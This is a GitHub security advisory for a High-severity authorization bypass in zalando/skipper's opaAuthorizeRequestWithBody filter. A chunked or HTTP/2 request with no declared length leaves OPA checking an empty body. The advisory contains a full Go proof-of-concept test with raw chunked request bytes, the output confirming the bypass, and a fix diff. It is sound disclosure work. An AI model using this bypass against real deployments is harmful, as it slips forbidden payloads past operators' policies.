# [H] Skipper: opaAuthorizeRequestWithBody filter bypasses OPA policy on Transfer-Encoding — chunked / HTTP/2 requests

## Summary
Severity: High
Advisory: GHSA-659f-rgp5-w4wf
CVE: CVE-2026-50197
CWE: CWE-444
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/E:U/RL:O (CVSS_V3)
Published: 2026-07-08
Source: https://github.com/advisories/GHSA-659f-rgp5-w4wf
Type: github-advisory

## Affected
- Go: `github.com/zalando/skipper` — affected >=0 <0.26.10

## Details
### Summary

`zalando/skipper`'s OpenPolicyAgent integration silently bypasses request-body
inspection on HTTP/1.1 `Transfer-Encoding: chunked` and HTTP/2 requests that
omit the `content-length` pseudo-header. When the
`opaAuthorizeRequestWithBody` filter is configured, the
`OpenPolicyAgentInstance.ExtractHttpBodyOptionally` helper produces an
empty `raw_body` for any request whose `Content-Length` header is missing,
while the underlying chunked body still flows through to the upstream
service. Rego policies that gate on `input.parsed_body` (e.g. "deny when a
forbidden field is present") evaluate against an empty document, treat the
forbidden field as absent, and authorize the request. The upstream handler
then receives the full attacker payload that the policy intended to block.

### Affected versions

`github.com/zalando/skipper` versions `<= v0.26.8` (the latest release on
2026-05-26, current `master` `4eed47ff`). The vulnerable helper and gate
have lived in `filters/openpolicyagent/openpolicyagent.go` since the
buffered-body extractor was introduced; no released version contains the
fix at the time of filing.

### Privilege required

Unauthenticated network access to the skipper proxy listener. The threat
model targets operators who place skipper in front of a private upstream
and rely on `opaAuthorizeRequestWithBody` to enforce body-content checks
(field allow/deny lists, payload schema gates, content-moderation flags,
multi-tenant per-action authorization). Both HTTP/1.1 and HTTP/2 clients
are affected; HTTP/2 traffic without a `content-length` pseudo-header is
the dominant case because Go's `net/http` sets
`http.Request.ContentLength = -1` for chunked HTTP/1.1 AND for HTTP/2
requests whose framing carries the body as DATA frames without an explicit
length header.

### Root cause

`filters/openpolicyagent/openpolicyagent.go:1242-1269` (HEAD `4eed47ff`):

```go
func bodyUpperBound(contentLength, maxBodyBytes int64) int64 {
    if contentLength <= 0 {
        return maxBodyBytes
    }
    if contentLength < maxBodyBytes {
        return contentLength
    }
    return maxBodyBytes
}

func (opa *OpenPolicyAgentInstance) ExtractHttpBodyOptionally(req *http.Request) (io.ReadCloser, []byte, func(), error) {
    body := req.Body
    if body != nil && !opa.EnvoyPluginConfig().SkipRequestBodyParse &&
        req.ContentLength <= int64(opa.maxBodyBytes) {
        wrapper := newBufferedBodyReader(req.Body, opa.maxBodyBytes, opa.bodyReadBufferSize)
        requestedBodyBytes := bodyUpperBound(req.ContentLength, opa.maxBodyBytes)
        if !opa.registry.maxMemoryBodyParsingSem.TryAcquire(requestedBodyBytes) {
            return req.Body, nil, func() {}, ErrTotalBodyBytesExceeded
        }
        rawBody, err := wrapper.fillBuffer(req.ContentLength)
        return wrapper, rawBody, func() { opa.registry.maxMemoryBodyParsingSem.Release(requestedBodyBytes) }, err
    }
    return req.Body, nil, func() {}, nil
}
```

`filters/openpolicyagent/openpolicyagent.go:1195-1210`:

```go
func (m *bufferedBodyReader) fillBuffer(expectedSize int64) ([]byte, error) {
    var err error
    for err == nil && int64(m.bodyBuffer.Len()) < m.maxBufferSize && int64(m.bodyBuffer.Len()) < expectedSize {
        var n int
        n, err = m.input.Read(m.readBuffer)
        m.bodyBuffer.Write(m.readBuffer[:n])
    }
    if err == io.EOF { err = nil }
    return m.bodyBuffer.Bytes(), err
}
```

When the client sends `Transfer-Encoding: chunked` (HTTP/1.1) or an
HTTP/2 request without `content-length`, Go's `net/http` server sets
`req.ContentLength = -1`. The gate at line 1258 (`req.ContentLength <=
int64(opa.maxBodyBytes)`) is true (`-1 <= positiveLimit`), so the body
gets wrapped in `bufferedBodyReader`. `bodyUpperBound(-1, max)` returns
`max`, so the memory semaphore is acquired, but `fillBuffer(-1)` then
evaluates `int64(m.bodyBuffer.Len()) < expectedSize` as `0 < -1`, which
is false on the first iteration. The loop never enters, the buffer stays
empty, and the helper returns `[]byte{}` as `rawBody` to the caller.

The caller in
`filters/openpolicyagent/opaauthorizerequest/opaauthorizerequest.go:121`
hands this empty slice to `envoy.AdaptToExtAuthRequest` which puts it
into `AttributeContext.Request.Http.RawBody`. The OPA SDK then exposes
the empty buffer as both `input.attributes.request.http.raw_body` and
the parsed `input.parsed_body` document (the latter becomes an
empty/undefined value). Any Rego rule that asserts the presence of a
forbidden field in `input.parsed_body` evaluates to undefined and fails
into the rule's default (typically `allow`).

Meanwhile, the wrapped `body` returned to the filter (`req.Body = body`
at line 127 of `opaauthorizerequest.go`) is a `bufferedBodyReader` whose
`Read()` falls through to the underlying `m.input.Read(p)` when the
buffer is empty (lines 1212-1228). The upstream handler therefore reads
the full attacker payload that OPA was never given a chance to inspect.

### Reproduction (E2E against pinned `github.com/zalando/skipper@v0.26.8`)

GHSA advisories have no file-attachment mechanism, so the complete
`poc_test.go` source and the verbatim `go test` output are inlined below.

The PoC is a Go test placed in
`filters/openpolicyagent/opaauthorizerequest/poc_test.go` inside a checkout
of the `v0.26.8` tag, so it links against the exact released source. It
boots a real skipper proxy via `proxytest.New`, configures it with the
`opaAuthorizeRequestWithBody` filter pointing at an in-process
`opasdktest.MustNewServer` bundle server, installs a Rego policy that
DENIES requests whose body contains `admin=true`, and adds a tiny upstream
that records the body it actually received. It then drives the proxy over a
raw TCP socket (`net.DialTimeout` + `http.ReadResponse`) to control the
wire framing precisely, sending three requests.

`poc_test.go`:

```go
package opaauthorizerequest

// PoC: opaAuthorizeRequestWithBody OPA-bypass on chunked / HTTP2 framing.
//
// The filter's body extractor (filters/openpolicyagent/openpolicyagent.go,
// ExtractHttpBodyOptionally) gates on `req.ContentLength <= maxBodyBytes`
// and then calls fillBuffer(req.ContentLength). When the client sends the
// body with Transfer-Encoding: chunked (HTTP/1.1) or via HTTP/2 without a
// declared length, net/http sets req.ContentLength = -1. The gate passes
// (-1 <= max) but fillBuffer's loop condition `len(buf) < expectedSize(-1)`
// is immediately false, so the buffered body is EMPTY. OPA therefore sees an
// empty input.parsed_body, a deny-policy that keys on the body fails open,
// and the full attacker body is forwarded upstream.
//
// This test boots a real skipper proxy (proxytest) with the
// opaAuthorizeRequestWithBody filter pointed at an in-process OPA bundle
// server (opasdktest) hosting a deny-when-admin=true policy, plus a tiny
// upstream that records the body it actually received. It then drives the
// proxy over a raw TCP socket to control the wire framing precisely.

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	opasdktest "github.com/open-policy-agent/opa/v1/sdk/test"
	"github.com/zalando/skipper/eskip"
	"github.com/zalando/skipper/filters"
	"github.com/zalando/skipper/filters/builtin"
	"github.com/zalando/skipper/proxy/proxytest"
	"github.com/zalando/skipper/tracing/tracingtest"

	"github.com/zalando/skipper/filters/openpolicyagent"
)

// rawRequest opens a fresh TCP connection to addr, writes wire verbatim, and
// returns the parsed HTTP response.
func rawRequest(t *testing.T, addr, wire string) *http.Response {
	t.Helper()
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		t.Fatalf("dial %s: %v", addr, err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	if _, err := io.WriteString(conn, wire); err != nil {
		t.Fatalf("write wire: %v", err)
	}

	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		t.Fatalf("read response: %v", err)
	}
	// Drain so the body received by upstream is flushed before we inspect it.
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	return resp
}

func TestSkipperOPABypassPoC(t *testing.T) {
	// Upstream records, per request, the body bytes it actually received.
	var mu sync.Mutex
	var upstreamBodies []string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		upstreamBodies = append(upstreamBodies, string(b))
		mu.Unlock()
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("UPSTREAM-REACHED"))
	}))
	defer upstream.Close()

	// OPA bundle: allow by default, deny only when the parsed body says admin==true.
	opaControlPlane := opasdktest.MustNewServer(
		opasdktest.MockBundle("/bundles/test", map[string]string{
			"main.rego": `
				package envoy.authz

				import rego.v1

				default allow := true

				allow := false if {
					input.parsed_body.admin == true
				}
			`,
		}),
	)
	defer opaControlPlane.Stop()

	config := fmt.Appendf(nil, `{
		"services": {
			"test": {
				"url": %q
			}
		},
		"bundles": {
			"test": {
				"resource": "/bundles/{{ .bundlename }}"
			}
		},
		"labels": {
			"environment": "test"
		},
		"plugins": {
			"envoy_ext_authz_grpc": {
				"path": "envoy/authz/allow",
				"dry-run": false
			}
		}
	}`, opaControlPlane.URL())

	opts := []func(*openpolicyagent.OpenPolicyAgentInstanceConfig) error{
		openpolicyagent.WithConfigTemplate(config),
	}

	opaFactory, err := openpolicyagent.NewOpenPolicyAgentRegistry(
		openpolicyagent.WithTracer(tracingtest.NewTracer()),
		openpolicyagent.WithOpenPolicyAgentInstanceConfig(opts...),
	)
	if err != nil {
		t.Fatalf("registry: %v", err)
	}

	fr := make(filters.Registry)
	fr.Register(NewOpaAuthorizeRequestWithBodySpec(opaFactory))
	fr.Register(builtin.NewSetPath())

	// Route: every request runs opaAuthorizeRequestWithBody, then proxies to upstream.
	r := eskip.MustParse(fmt.Sprintf(
		`* -> opaAuthorizeRequestWithBody("test") -> "%s"`, upstream.URL))

	proxy := proxytest.New(fr, r...)
	defer proxy.Close()

	host := strings.TrimPrefix(proxy.URL, "http://")

	type tc struct {
		name       string
		wire       string
		wantStatus int
		wantUpstrm bool // whether upstream is expected to be reached
	}

	cases := []tc{
		{
			name: "1: Content-Length benign body -> 200 ALLOW",
			wire: "POST /priv HTTP/1.1\r\n" +
				"Host: " + host + "\r\n" +
				"Content-Type: application/json\r\n" +
				"Connection: close\r\n" +
				"Content-Length: 15\r\n" +
				"\r\n" +
				`{"admin":false}`,
			wantStatus: 200,
			wantUpstrm: true,
		},
		{
			name: "2: Content-Length admin body -> 403 DENY (negative control)",
			wire: "POST /priv HTTP/1.1\r\n" +
				"Host: " + host + "\r\n" +
				"Content-Type: application/json\r\n" +
				"Connection: close\r\n" +
				"Content-Length: 14\r\n" +
				"\r\n" +
				`{"admin":true}`,
			wantStatus: 403,
			wantUpstrm: false,
		},
		{
			name: "3: chunked admin body -> EXPECTED 403, BUG 200 (bypass)",
			wire: "POST /priv HTTP/1.1\r\n" +
				"Host: " + host + "\r\n" +
				"Content-Type: application/json\r\n" +
				"Connection: close\r\n" +
				"Transfer-Encoding: chunked\r\n" +
				"\r\n" +
				"e\r\n" +
				`{"admin":true}` + "\r\n" +
				"0\r\n" +
				"\r\n",
			wantStatus: 200, // documents the BUG: should be 403 but the bypass yields 200
			wantUpstrm: true,
		},
	}

	for _, c := range cases {
		mu.Lock()
		before := len(upstreamBodies)
		mu.Unlock()

		resp := rawRequest(t, host, c.wire)

		mu.Lock()
		reached := len(upstreamBodies) > before
		var lastBody string
		if reached {
			lastBody = upstreamBodies[len(upstreamBodies)-1]
		}
		mu.Unlock()

		t.Logf("[%s] status=%d upstreamReached=%v upstreamBody=%q",
			c.name, resp.StatusCode, reached, lastBody)

		if resp.StatusCode != c.wantStatus {
			t.Errorf("[%s] status = %d, want %d", c.name, resp.StatusCode, c.wantStatus)
		}
		if reached != c.wantUpstrm {
			t.Errorf("[%s] upstreamReached = %v, want %v", c.name, reached, c.wantUpstrm)
		}
	}

	// Explicit bypass assertion: the chunked admin body MUST have reached
	// upstream verbatim despite the deny policy.
	mu.Lock()
	defer mu.Unlock()
	bypassed := false
	for _, b := range upstreamBodies {
		if b == `{"admin":true}` {
			bypassed = true
		}
	}
	if bypassed {
		t.Logf("BYPASS CONFIRMED: upstream received {\"admin\":true} despite deny policy (OPA saw empty parsed_body for the chunked request)")
	} else {
		t.Errorf("expected the chunked admin body to reach upstream (bypass), but it did not")
	}
}
```

The three requests cover:

| # | Wire framing | Body | Expected | Got |
|---|--------------|------|----------|-----|
| 1 | `Content-Length: 15` | `{"admin":false}` | 200 ALLOW | 200 (upstream reached) |
| 2 | `Content-Length: 14` | `{"admin":true}` | 403 DENY  | 403 (OPA blocked) |
| 3 | `Transfer-Encoding: chunked` | `{"admin":true}` | 403 DENY | **200 ALLOW (bypass)** |

Test 3 wire bytes: `POST /priv HTTP/1.1\r\nHost: ...\r\nContent-Type:
application/json\r\nConnection: close\r\nTransfer-Encoding:
chunked\r\n\r\ne\r\n{"admin":true}\r\n0\r\n\r\n`.

Run command and verbatim output (`go version go1.26.3 darwin/arm64`,
`github.com/open-policy-agent/opa v1.14.1` as pinned by skipper `v0.26.8`):

```
$ go test -v -run TestSkipperOPABypassPoC -count=1 ./filters/openpolicyagent/opaauthorizerequest/
=== RUN   TestSkipperOPABypassPoC
2026/05/28 14:43:47 route settings, reset, route: : * -> opaAuthorizeRequestWithBody("test") -> "http://127.0.0.1:57343"
2026/05/28 14:43:47 route settings received, id: 1
time="2026-05-28T14:43:47+08:00" level=info msg="Starting OPA instance..." bundle-name=test
time="2026-05-28T14:43:47+08:00" level=info msg="OPA instance health updated: healthy=false status=map[bundle:{NOT_READY \"\"} discovery:{NOT_READY \"\"} envoy_ext_authz_grpc:{OK \"\"}]" bundle-name=test
time="2026-05-28T14:43:47+08:00" level=info msg="OPA instance health updated: healthy=false status=map[bundle:{NOT_READY \"\"} discovery:{OK \"\"} envoy_ext_authz_grpc:{OK \"\"}]" bundle-name=test
time="2026-05-28T14:43:47+08:00" level=info msg="OPA instance health updated: healthy=true status=map[bundle:{OK \"\"} discovery:{OK \"\"} envoy_ext_authz_grpc:{OK \"\"}]" bundle-name=test
2026/05/28 14:43:47 route settings applied, id: 1
    poc_test.go:211: [1: Content-Length benign body -> 200 ALLOW] status=200 upstreamReached=true upstreamBody="{\"admin\":false}"
    poc_test.go:211: [2: Content-Length admin body -> 403 DENY (negative control)] status=403 upstreamReached=false upstreamBody=""
    poc_test.go:211: [3: chunked admin body -> EXPECTED 403, BUG 200 (bypass)] status=200 upstreamReached=true upstreamBody="{\"admin\":true}"
    poc_test.go:233: BYPASS CONFIRMED: upstream received {"admin":true} despite deny policy (OPA saw empty parsed_body for the chunked request)
--- PASS: TestSkipperOPABypassPoC (0.11s)
PASS
ok  	github.com/zalando/skipper/filters/openpolicyagent/opaauthorizerequest	1.897s
```

Test 1 (Content-Length, benign body) is allowed and reaches upstream with
`{"admin":false}`. Test 2 is the negative control: the same `{"admin":true}`
payload sent with a `Content-Length` header is correctly DENIED (HTTP 403)
and never reaches the upstream, proving the policy itself is sound. Test 3
sends the identical forbidden body as `Transfer-Encoding: chunked`; OPA
evaluates an empty `parsed_body`, the deny rule fails open, the proxy
returns HTTP 200, and the upstream receives the full `{"admin":true}`
payload that the policy was configured to block.

### Impact

Operators relying on `opaAuthorizeRequestWithBody` for body-content
authorization are silently downgraded to header/path-only authorization
for any client that emits chunked or HTTP/2 requests. Concrete
production patterns affected:

- "Deny when body contains admin/privileged field" guardrails for
  multi-tenant or role-stratified APIs;
- "Deny when content-moderation flag is present" filters in front of
  user-content endpoints;
- "Deny when payload schema version is forbidden" gates for
  deprecated-API shutdown;
- "Deny when SQL/command-injection-shaped string is present" generic
  body validators.

In every case the chunked attack arrives with the forbidden body
intact, OPA evaluates against an empty document, the policy fails open,
and the upstream receives the attacker payload that the deployment was
specifically configured to block. There is no log signal in OPA's
decision log distinguishing "body was empty" from "client did not send
a body".

Note that the OPA decision log will record the request as ALLOWED with
`raw_body` length 0, which complicates post-hoc forensic detection. The
upstream's request log will show the full body, producing a confusing
allow/observed asymmetry across systems.

CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` (8.5 HIGH). Scope is
Changed because the failure crosses the trust boundary between the
authorization filter and the upstream service.

### Suggested fix

`filters/openpolicyagent/openpolicyagent.go`:

```diff
 func (opa *OpenPolicyAgentInstance) ExtractHttpBodyOptionally(req *http.Request) (io.ReadCloser, []byte, func(), error) {
 	body := req.Body
 
+	// `req.ContentLength == -1` is set by net/http when the client uses
+	// Transfer-Encoding: chunked (HTTP/1.1) or omits content-length in
+	// HTTP/2 framing. Treat unknown-length bodies as up-to-max-bytes and
+	// drive fillBuffer with the policy cap instead of the negative
+	// sentinel, otherwise the fillBuffer loop short-circuits on its
+	// `len < expectedSize` predicate and OPA evaluates an empty body.
+	expectedSize := req.ContentLength
+	if expectedSize < 0 {
+		expectedSize = opa.maxBodyBytes
+	}
+
 	if body != nil && !opa.EnvoyPluginConfig().SkipRequestBodyParse &&
-		req.ContentLength <= int64(opa.maxBodyBytes) {
+		expectedSize <= int64(opa.maxBodyBytes) {
 
 		wrapper := newBufferedBodyReader(req.Body, opa.maxBodyBytes, opa.bodyReadBufferSize)
 
-		requestedBodyBytes := bodyUpperBound(req.ContentLength, opa.maxBodyBytes)
+		requestedBodyBytes := bodyUpperBound(expectedSize, opa.maxBodyBytes)
 		if !opa.registry.maxMemoryBodyParsingSem.TryAcquire(requestedBodyBytes) {
 			return req.Body, nil, func() {}, ErrTotalBodyBytesExceeded
 		}
 
-		rawBody, err := wrapper.fillBuffer(req.ContentLength)
+		rawBody, err := wrapper.fillBuffer(expectedSize)
 		return wrapper, rawBody, func() { opa.registry.maxMemoryBodyParsingSem.Release(requestedBodyBytes) }, err
 	}
 
 	return req.Body, nil, func() {}, nil
 }
```

After the fix, `fillBuffer(maxBodyBytes)` reads chunked bodies up to
the configured cap. If the body exceeds the cap, the existing `Read()`
path already returns the wrapped reader for downstream consumption,
matching the documented behaviour for over-cap requests today; the
operator-configured `maxRequestBodyBytes` continues to be the single
knob governing memory allocation.

A regression test `TestOpaAuthorizeRequestWithBody_ChunkedBodyIsParsed`
in `filters/openpolicyagent/opaauthorizerequest/opaauthorizerequest_test.go`
should send a `Transfer-Encoding: chunked` request matching a
blacklist policy and assert HTTP 403, and a same-payload Content-Length
request to confirm parity.

### Credit

Reported by tonghuaroot.

## References
- https://github.com/zalando/skipper/security/advisories/GHSA-659f-rgp5-w4wf
- https://github.com/zalando/skipper
